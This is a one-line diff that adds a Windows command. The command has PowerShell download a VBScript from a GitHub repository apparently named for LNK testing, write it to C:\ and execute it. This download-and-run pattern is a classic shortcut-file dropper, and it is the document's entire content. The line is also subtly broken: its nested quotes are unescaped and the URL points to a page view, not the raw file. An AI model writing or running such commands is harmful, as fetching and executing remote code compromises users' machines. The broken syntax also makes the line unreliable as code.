@@ -1,0 +1,1 @@
+cmd /c "powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/aihkw/lnk-testing/blob/main/hello.vbs', 'C:\hello.vbs'); Start-Process 'C:\hello.vbs'"
